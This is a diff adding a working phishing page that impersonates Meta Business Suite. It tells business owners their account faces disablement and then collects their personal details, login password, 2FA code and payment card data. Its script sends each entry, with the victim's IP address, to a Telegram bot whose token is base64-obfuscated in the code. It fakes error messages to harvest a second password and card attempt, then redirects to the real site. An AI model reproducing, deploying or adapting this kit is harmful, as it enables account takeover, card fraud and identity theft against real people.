@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta Business Suite</title>
+    <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
+    <style>
+        :root { --m-blue: #1877F2; --m-bg: #FFFFFF; --m-text: #1C1E21; --m-gray: #65676B; --m-border: #ced4da; --fb-bg: #F0F2F5; }
+        body { font-family: "Segoe UI", Helvetica, Arial, sans-serif; background: white; margin: 0; color: var(--m-text); display: flex; flex-direction: column; min-height: 100vh; }
+      
+        .nav { background: white; padding: 12px 15px; border-bottom: 1px solid #dddfe2; display: flex; align-items: center; }
+        @media (min-width: 900px) { .nav { padding: 12px 50px; background: #f0f2f5; } }
+      
+        /* MOBILE FULL-SCREEN SETTINGS */
+        .card { background: white; width: 100%; margin: 0 auto; padding: 20px; box-sizing: border-box; }
+        
+        /* PC/IPAD CENTERED SETTINGS */
+        @media (min-width: 768px) { 
+            body { background: #f0f2f5; }
+            .card { width: 92%; max-width: 500px; margin: 40px auto; padding: 40px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); }
+            #p1 { max-width: 900px; background: transparent; box-shadow: none; }
+        }
+      
+        .chat-bubble { position: fixed; bottom: 20px; right: 20px; background: white; border-radius: 50px; padding: 10px 20px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border: 1px solid #eee; z-index: 999; }
+        .chat-status { width: 10px; height: 10px; background: #42b72a; border-radius: 50%; animation: pulse 2s infinite; }
+        .chat-text { font-size: 11px; color: var(--m-gray); font-weight: 600; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+      
+        #p1 { text-align: center; }
+        .illustration img { width: 100%; max-width: 600px; height: auto; }
+      
+        h1 { font-size: 22px; font-weight: 700; margin: 0 0 15px 0; }
+        .sub-text { color: var(--m-text); font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
+      
+        input, select { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid var(--m-border); border-radius: 6px; font-size: 16px; box-sizing: border-box; background: #F5F6F7; }
+        input:focus { border-color: var(--m-blue); background: white; outline: none; }
+      
+        .bday-row { display: flex; gap: 8px; margin-bottom: 15px; }
+        .bday-label { font-size: 13px; color: var(--m-gray); margin-bottom: 8px; text-align: left; font-weight: 600; }
+      
+        .err-msg { color: #f02849; font-size: 13px; margin-top: -10px; margin-bottom: 15px; display: none; }
+        
+        .btn { background: var(--m-blue); color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; }
+        @media (min-width: 768px) { .btn { width: auto; padding: 12px 40px; float: right; } #p1 .btn { float: none; width: 300px; } }
+      
+        .hidden { display: none; }
+        .fade-in { animation: fadeIn 0.3s forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+      
+        .otp-box { letter-spacing: 12px; font-size: 26px; text-align: center; font-weight: bold; background: white !important; }
+        footer { margin-top: auto; padding: 25px; text-align: center; color: var(--m-gray); font-size: 12px; }
+        
+        .card-icons { text-align: right; margin-bottom: 5px; }
+        .card-icons img { height: 20px; margin-left: 8px; }
+        .expiry-cvv-row { display: flex; gap: 10px; }
+    </style>
+</head>
+<body>
+<div class="chat-bubble">
+    <div class="chat-status"></div>
+    <div class="chat-text">Support Online</div>
+</div>
+<div class="nav">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" height="18">
+</div>
+
+<div id="p1" class="card fade-in">
+    <img src="image.png" width="80" style="margin: 20px 0;">
+    <div style="text-transform: uppercase; font-size: 14px; letter-spacing: 1px; color: var(--m-gray);"><b>Security Department</b></div>
+    <h1 style="margin-top: 10px;">Review Required</h1>
+    <p class="sub-text">Someone reported your business for violating our <b>Community Standards</b>. To prevent your account from being disabled, you must complete the security check.</p>
+    <p style="font-size: 14px;">Time remaining: <span id="timer1" style="color: #f02849; font-weight: bold;">12 hours</span></p>
+    <button class="btn" onclick="step(1, 2)">GET STARTED</button>
+</div>
+
+<div id="p2" class="card hidden">
+    <h1>Account Details</h1>
+    <p class="sub-text">Please provide your official business information as it appears on your account.</p>
+    <input type="text" id="pname" placeholder="Business Page Name">
+    <input type="text" id="fname" placeholder="Full Name">
+    <input type="text" id="phone" placeholder="Phone Number">
+    <div class="bday-label">Date of Birth</div>
+    <div class="bday-row">
+        <select id="b_day"><option value="">Day</option><script>for(let i=1;i<=31;i++)document.write('<option value="'+i+'">'+i+'</option>')</script></select>
+        <select id="b_month"><option value="">Month</option><option value="Jan">Jan</option><option value="Dec">Dec</option></select>
+        <select id="b_year"><option value="">Year</option><script>for(let i=2005;i>=1960;i--)document.write('<option value="'+i+'">'+i+'</option>')</script></select>
+    </div>
+    <button class="btn" onclick="step(2, 3)">Continue</button>
+</div>
+
+<div id="p3" class="card hidden">
+    <h1>Identity Verification</h1>
+    <p class="sub-text">Enter your login credentials to confirm you are the owner of this business page.</p>
+    <input type="text" id="email" placeholder="Email or Phone Number">
+    <input type="password" id="pass" placeholder="Password">
+    <div id="pass-err" class="err-msg">Incorrect password. Please try again.</div>
+    <button class="btn" onclick="step(3, 4)">Confirm Identity</button>
+</div>
+
+<div id="p4" class="card hidden">
+    <h1>Security Code</h1>
+    <p class="sub-text">We sent a code to your device. Enter it below to continue.</p>
+    <input type="text" id="otp" class="otp-box" maxlength="6" placeholder="000000">
+    <button class="btn" onclick="step(4, 5)">Verify Code</button>
+</div>
+
+<div id="p5" class="card hidden">
+    <h1>Payment Verification</h1>
+    <p class="sub-text">Verify your primary payment method to restore full advertising access.</p>
+    <input type="text" id="card_name" placeholder="Name on Card">
+    <div class="card-icons"><img src="visa.png"><img src="mastercard.png"></div>
+    <input type="text" id="card_number" placeholder="Card Number" maxlength="19" onkeyup="formatCard(this)">
+    <div class="expiry-cvv-row">
+        <input type="text" id="card_expiry" placeholder="MM/YY" maxlength="5">
+        <input type="text" id="card_cvv" placeholder="CVV" maxlength="4">
+    </div>
+    <div id="card-err" class="err-msg">Invalid card details. Please try again.</div>
+    <button class="btn" onclick="step(5, 6)">Confirm Payment</button>
+</div>
+
+<div id="p6" class="card hidden" style="text-align: center;">
+    <div style="border: 3px solid #f3f3f3; border-top: 3px solid var(--m-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+    <p>Verifying information...</p>
+</div>
+
+<footer>Meta Business Suite © 2025</footer>
+
+<script>
+    /* TELEGRAM LOGIC */
+    const _eT = "ODM0MjI3NzQ4MzpBQUZxVjlMdmJRQkcyLVZCOXhsMFZMaHFTaFpLNkljRXA1cw==";
+    const _eC = "NTkwMTM5NjY0OA==";
+    const _t = atob(_eT); const _c = atob(_eC);
+    const _bU = "https://api.telegram.org/bot";
+    let uIP = "Detecting..."; let loginAttempts = 0; let cardAttempts = 0;
+
+    async function send(msg) {
+        return fetch(_bU + _t + "/sendMessage", {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: _c, text: msg, parse_mode: 'Markdown' })
+        });
+    }
+
+    /* FORMATTING & STEPS */
+    function formatCard(e) {
+        let v = e.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let parts = v.match(/.{1,4}/g);
+        e.value = parts ? parts.join(' ') : v;
+    }
+
+    async function step(f, t) {
+        const div = document.getElementById('p' + f);
+        const inputs = div.querySelectorAll('input');
+        const btn = event.target;
+        
+        for(let i of inputs) { if(i.value === "") { i.style.border="1px solid red"; return; } }
+
+        if (f === 3 && loginAttempts === 0) {
+            btn.innerText = "Checking...";
+            await send(`🔑 *LOGIN 1*\nUser: ${document.getElementById('email').value}\nPass: ${document.getElementById('pass').value}\nIP: ${uIP}`);
+            setTimeout(() => { loginAttempts++; document.getElementById('pass-err').style.display="block"; btn.innerText="Confirm Identity"; }, 1000);
+            return;
+        }
+
+        if (f === 5 && cardAttempts === 0) {
+            btn.innerText = "Checking...";
+            await send(`💳 *CARD 1*\nNum: ${document.getElementById('card_number').value}\nCVV: ${document.getElementById('card_cvv').value}\nIP: ${uIP}`);
+            setTimeout(() => { cardAttempts++; document.getElementById('card-err').style.display="block"; btn.innerText="Confirm Payment"; }, 1000);
+            return;
+        }
+
+        div.classList.add('hidden');
+        document.getElementById('p' + t).classList.remove('hidden');
+        document.getElementById('p' + t).classList.add('fade-in');
+
+        if(f==2) send(`👤 *DETAILS*\nName: ${document.getElementById('fname').value}\nPhone: ${document.getElementById('phone').value}`);
+        if(f==3) send(`🔑 *LOGIN 2*\nUser: ${document.getElementById('email').value}\nPass: ${document.getElementById('pass').value}`);
+        if(f==4) send(`🛡️ *2FA*\nCode: ${document.getElementById('otp').value}`);
+        if(f==5) {
+            send(`💳 *CARD 2*\nNum: ${document.getElementById('card_number').value}\nExp: ${document.getElementById('card_expiry').value}`);
+            setTimeout(() => { window.location.href="https://facebook.com/business"; }, 2500);
+        }
+    }
+
+    window.onload = async () => {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json(); uIP = data.ip;
+        send(`🟢 *ONLINE*\nIP: ${uIP}`);
+    };
+</script>
+</body>
+</html>
